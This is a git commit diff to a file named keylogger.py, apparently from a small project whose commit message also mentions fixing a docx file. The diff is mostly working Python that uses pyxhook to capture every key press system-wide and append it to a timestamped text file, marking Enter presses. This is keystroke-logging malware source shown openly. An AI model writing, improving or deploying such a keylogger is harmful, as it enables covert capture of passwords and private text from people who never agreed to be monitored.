28d2ad234f6ce6975cabd974050541efc0d3db37
WU19-1 <wahyu.mai@gmail.com>
2021-06-16 05:41:39 +0700

    fix keylogger, fix docx, add random fact in docx

--- keylogger.py
+++ keylogger.py
@@ -1,15 +1,14 @@
-import sys
-
 import pyxhook
 import time
 
 FILE = None
 
 def main():
-    global FILE
+    global FILE, filename
     now = time.localtime()
-    filename = str(now.tm_mday) + str(now.tm_mon) + str(now.tm_year) + str(now.tm_hour) + str(now.tm_min) + str(now.tm_sec)
-    FILE = open(filename + ".txt", "w")
+    filename = str(now.tm_mday) + str(now.tm_mon) + str(now.tm_year) + str(now.tm_hour) + str(now.tm_min) + str(now.tm_sec) + ".txt"
+    FILE = open(filename, "w")
+    FILE.close()
     start_keylog()
 
 def start_keylog():    
@@ -23,8 +22,18 @@ def start_keylog():
         exit(print("Keylogger stopped"))
 
 def on_key_press(event):
-    # print(event.Key)
-    FILE.write(event.Key)
+    try:
+        with open(filename, 'a') as f:
+            if event.Key == 'Return':
+                f.write(' Enter\n')
+            else:
+                f.write(event.Key)
+    except Exception as e:
+        print(e)
+        with open(filename, 'a') as f:
+            f.write(e.message())
+            f.close()
+            exit()
 
 if __name__ == "__main__":
     main()
